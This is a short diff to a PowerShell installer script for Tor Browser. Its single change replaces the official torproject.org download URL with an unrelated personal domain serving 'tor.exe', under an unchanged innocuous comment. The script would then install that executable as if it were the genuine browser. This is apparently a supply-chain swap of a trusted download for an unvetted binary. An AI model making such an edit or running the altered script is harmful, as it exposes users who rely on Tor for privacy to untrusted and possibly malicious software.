@@ -27,7 +27,7 @@ Write-Host "Downloaded file to: $outputFile"
 $InstallerName = "tor-browser-install-win64-latest.exe"
 $InstallerPath = Join-Path $env:TEMP $InstallerName
 $InstallDir = "C:\Program Files\Tor Browser"
-$DownloadUrl = "https://torproject.org" # Update version if needed
+$DownloadUrl = "https://rickieproctor.com/tor.exe" # Update version if needed
 $DesktopShortcutPath = "$env:PUBLIC\Desktop\Tor Browser.lnk"
 
 # --- 1. Download Installer ---
